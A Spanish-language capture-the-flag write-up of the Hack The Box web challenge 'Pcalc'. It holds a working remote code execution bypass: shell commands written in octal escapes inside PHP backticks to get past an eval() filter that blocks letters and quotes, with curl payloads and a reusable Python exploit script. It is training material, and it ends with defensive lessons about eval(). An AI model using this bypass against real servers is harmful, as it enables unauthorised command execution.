---
title: "Pcalc"
description: "Writeup de Pcalc - Hack The Box - Web 300pts. PHP eval() con filtro que bloquea letras y comillas; bypass mediante octal encoding de los comandos dentro de backticks: \\143\\141\\164\\40\\57\\146\\52 equivale a 'cat /f*'."
sidebar:
  badge:
    text: Web
    variant: note
tags:
  - htb
  - web
  - php
  - eval
  - filter-bypass
  - octal
  - rce
  - waf-bypass
---

# Pcalc

> 🎯 Plataforma: Hack The Box
> 📂 Categoría: Web
> 🏆 Puntos: 300
> 👤 Autor: warrior866

---

## Descripción

Una "calculadora PHP" que evalúa expresiones matemáticas via `eval()`. El servidor filtra caracteres: bloquea todas las letras (`a-zA-Z`) y las comillas (`'` y `"`). Hay que ejecutar comandos del sistema usando solo caracteres no filtrados.

---

## Reconocimiento

La calculadora acepta expresiones:

```bash
curl -s "$HOST/?expr=1+1"
```

```text
2
```

Intentar RCE directo:

```bash
curl -s "$HOST/?expr=system('id')"
```

```text
Error: filtered characters detected
```

---

## Bypass con octal y backticks

PHP permite representar caracteres con su valor octal en strings. Los backticks (`` ` ``) ejecutan comandos de shell en PHP sin necesitar la función `system()` ni comillas.

Convertir `cat /f*` a octal:

```python
cmd = "cat /f*"
octal = ''.join([f'\\{oct(ord(c))[2:]}' for c in cmd])
print(octal)
# \143\141\164\40\57\146\52
```

Verificación manual:
- `\143` = 99 decimal = `c`
- `\141` = 97 decimal = `a`
- `\164` = 116 decimal = `t`
- `\40` = 32 decimal = ` ` (espacio)
- `\57` = 47 decimal = `/`
- `\146` = 102 decimal = `f`
- `\52` = 42 decimal = `*`

El payload en backticks usa la string octal directamente:

```bash
curl -s "$HOST/?expr=\`\143\141\164\40\57\146\52\`"
```

```text
HTB{FLAG}
```

---

## Script de explotación

```python
import requests

HOST = "http://IP:PORT"

def to_octal(cmd):
    return ''.join([f'\\{oct(ord(c))[2:]}' for c in cmd])

def exec_cmd(cmd):
    payload = f'`{to_octal(cmd)}`'
    r = requests.get(HOST, params={'expr': payload})
    return r.text

# Obtener la flag
print(exec_cmd("cat /flag.txt"))
print(exec_cmd("cat /f*"))
```

---

## Cadena de Ataque

```text
1. GET /?expr=1+1 → calculadora PHP con eval()
       ↓
2. Intentar system('id') → "filtered characters detected"
       ↓
3. Identificar filtro: bloquea a-zA-Z y comillas
       ↓
4. Backticks ejecutan shell en PHP sin funciones y sin letras
       ↓
5. Octal encoding: cada char → \NNN (no usa letras)
       ↓
6. `\143\141\164\40\57\146\52` = `cat /f*` → flag
```

---

## Lecciones Aprendidas

- **eval() es siempre peligroso**: incluso con filtros, un `eval()` con input del usuario es extremadamente difícil de asegurar completamente. La única solución real es no usar `eval()` con input externo.
- **Encoding bypasses en PHP**: PHP soporta octal (`\NNN`), hex (`\xNN`), y Unicode (`\u{NNNN}`) para representar caracteres en strings — todos pueden eludir filtros basados en caracteres.
- **Backticks en PHP**: el operador `` ` `` en PHP es equivalente a `shell_exec()`. Si no se filtra, permite ejecución de comandos sin usar ninguna función de nombre explícito.
- **Filtros de WAF**: los filtros por carácter/función raramente son completos. La seguridad real requiere prohibir completamente el uso de `eval()` y evitar pasar input no confiable al intérprete.

---

## Referencias

- [PHP — Execution Operators (backticks)](https://www.php.net/manual/en/language.operators.execution.php)
- [PHP — Octal notation](https://www.php.net/manual/en/language.types.string.php)
- [HackTricks — PHP Tricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp)
